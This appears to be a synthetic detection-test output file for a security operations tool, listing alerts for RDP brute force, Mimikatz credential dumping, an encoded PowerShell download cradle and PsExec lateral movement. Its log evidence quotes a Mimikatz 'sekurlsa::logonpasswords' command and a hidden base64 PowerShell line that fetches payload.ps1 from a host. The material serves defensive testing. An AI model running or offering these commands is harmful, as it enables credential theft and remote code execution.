@@ -1,0 +1,197 @@
+{
+  "generated_at": "2026-10-04T22:52:17.977330Z",
+  "log_counts": {
+    "sysmon": 13,
+    "security": 12,
+    "network": 10
+  },
+  "alert_count": 6,
+  "max_severity_score": 95,
+  "incident_declared": true,
+  "kill_chain_coverage": [
+    "Reconnaissance",
+    "Initial Access (T1110)",
+    "Execution (T1059)",
+    "Credential Access (T1003)",
+    "Lateral Movement (T1570)"
+  ],
+  "alerts": [
+    {
+      "rule_id": "test-soc-003",
+      "title": "Mimikatz Execution",
+      "severity": "critical",
+      "tactic": "Credential Access",
+      "technique": "T1003.001",
+      "computer": "WS01.corp.local",
+      "evidence": {
+        "@timestamp": "2026-10-04T14:09:00Z",
+        "EventID": 1,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "Computer": "WS01.corp.local",
+        "User": "CORP\\Administrator",
+        "Image": "C:\\Users\\Public\\mimikatz.exe",
+        "CommandLine": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
+        "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Hashes": "SHA256=BAD123",
+        "Description": "MALICIOUS: mimikatz execution"
+      },
+      "recommendation": "Isolate host immediately, rotate credentials, hunt for lsass dumps"
+    },
+    {
+      "rule_id": "test-soc-001",
+      "title": "RDP Brute Force Attempt",
+      "severity": "high",
+      "tactic": "Credential Access",
+      "technique": "T1110.001",
+      "src_ip": "192.168.1.105",
+      "count": 5,
+      "success": true,
+      "evidence": [
+        {
+          "TimeCreated": "2026-10-04T14:03:00Z",
+          "EventID": "4625",
+          "Computer": "DC01.corp.local",
+          "TargetUserName": "Administrator",
+          "SourceIP": "192.168.1.105",
+          "LogonType": "10",
+          "Status": "0xC000006D",
+          "Details": "Failed RDP logon - bad password"
+        },
+        {
+          "TimeCreated": "2026-10-04T14:03:00Z",
+          "EventID": "4625",
+          "Computer": "DC01.corp.local",
+          "TargetUserName": "Administrator",
+          "SourceIP": "192.168.1.105",
+          "LogonType": "10",
+          "Status": "0xC000006D",
+          "Details": "Failed RDP logon"
+        },
+        {
+          "TimeCreated": "2026-10-04T14:04:00Z",
+          "EventID": "4625",
+          "Computer": "DC01.corp.local",
+          "TargetUserName": "Administrator",
+          "SourceIP": "192.168.1.105",
+          "LogonType": "10",
+          "Status": "0xC000006D",
+          "Details": "Failed RDP logon"
+        },
+        {
+          "TimeCreated": "2026-10-04T14:04:00Z",
+          "EventID": "4625",
+          "Computer": "DC01.corp.local",
+          "TargetUserName": "Administrator",
+          "SourceIP": "192.168.1.105",
+          "LogonType": "10",
+          "Status": "0xC000006D",
+          "Details": "Failed RDP logon"
+        },
+        {
+          "TimeCreated": "2026-10-04T14:05:00Z",
+          "EventID": "4625",
+          "Computer": "DC01.corp.local",
+          "TargetUserName": "Administrator",
+          "SourceIP": "192.168.1.105",
+          "LogonType": "10",
+          "Status": "0xC000006D",
+          "Details": "Failed RDP logon - 5th attempt"
+        },
+        {
+          "TimeCreated": "2026-10-04T14:06:00Z",
+          "EventID": "4624",
+          "Computer": "DC01.corp.local",
+          "TargetUserName": "Administrator",
+          "SourceIP": "192.168.1.105",
+          "LogonType": "10",
+          "Status": "0x0",
+          "Details": "Successful RDP logon after brute force"
+        }
+      ],
+      "recommendation": "Block src_ip at firewall, force password reset, review RDP exposure"
+    },
+    {
+      "rule_id": "test-soc-002",
+      "title": "Encoded PowerShell Download Cradle",
+      "severity": "high",
+      "tactic": "Execution",
+      "technique": "T1059.001",
+      "computer": "WS01.corp.local",
+      "user": "CORP\\Administrator",
+      "commandline": "powershell.exe -NoP -W Hidden -Enc SQBmACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEAMAA1AC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
+      "decoded_preview": "If(New-Object Net.WebClient).DownloadString('http://192.168.1.105/payload.ps1')",
+      "evidence": {
+        "@timestamp": "2026-10-04T14:07:00Z",
+        "EventID": 1,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "Computer": "WS01.corp.local",
+        "User": "CORP\\Administrator",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe -NoP -W Hidden -Enc SQBmACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEAMAA1AC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
+        "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+        "ParentCommandLine": "svchost.exe -k netsvcs",
+        "Description": "MALICIOUS: base64 encoded IEX download cradle"
+      },
+      "recommendation": "Isolate host, collect payload.ps1, block IOC domain/IP"
+    },
+    {
+      "rule_id": "test-soc-004",
+      "title": "PsExec Lateral Movement",
+      "severity": "high",
+      "tactic": "Lateral Movement",
+      "technique": "T1570",
+      "computer": "WS02.corp.local",
+      "evidence": {
+        "@timestamp": "2026-10-04T14:12:00Z",
+        "EventID": 1,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "Computer": "WS02.corp.local",
+        "User": "NT AUTHORITY\\SYSTEM",
+        "Image": "C:\\Windows\\PSEXESVC.exe",
+        "CommandLine": "PSEXESVC.exe",
+        "ParentImage": "C:\\Windows\\System32\\services.exe",
+        "Description": "MALICIOUS: PsExec service"
+      },
+      "recommendation": "Validate admin use; if unauthorized, contain both hosts"
+    },
+    {
+      "rule_id": "test-soc-004",
+      "title": "PsExec Lateral Movement",
+      "severity": "high",
+      "tactic": "Lateral Movement",
+      "technique": "T1570",
+      "computer": "WS01.corp.local",
+      "evidence": {
+        "@timestamp": "2026-10-04T14:13:00Z",
+        "EventID": 3,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "Computer": "WS01.corp.local",
+        "Image": "C:\\Windows\\PSEXESVC.exe",
+        "DestinationIp": "10.0.1.12",
+        "DestinationPort": 445,
+        "Protocol": "tcp",
+        "Description": "MALICIOUS: SMB lateral to WS02"
+      },
+      "recommendation": "Validate admin use; if unauthorized, contain both hosts"
+    },
+    {
+      "rule_id": "test-soc-004",
+      "title": "PsExec Service Installed",
+      "severity": "high",
+      "tactic": "Lateral Movement",
+      "technique": "T1570",
+      "computer": "WS02.corp.local",
+      "evidence": {
+        "TimeCreated": "2026-10-04T14:12:00Z",
+        "EventID": "7045",
+        "Computer": "WS02.corp.local",
+        "TargetUserName": "SYSTEM",
+        "SourceIP": "-",
+        "LogonType": "-",
+        "Status": "0x0",
+        "Details": "Service PSEXESVC installed"
+      },
+      "recommendation": "Correlate with Sysmon network 445 events"
+    }
+  ]
+}
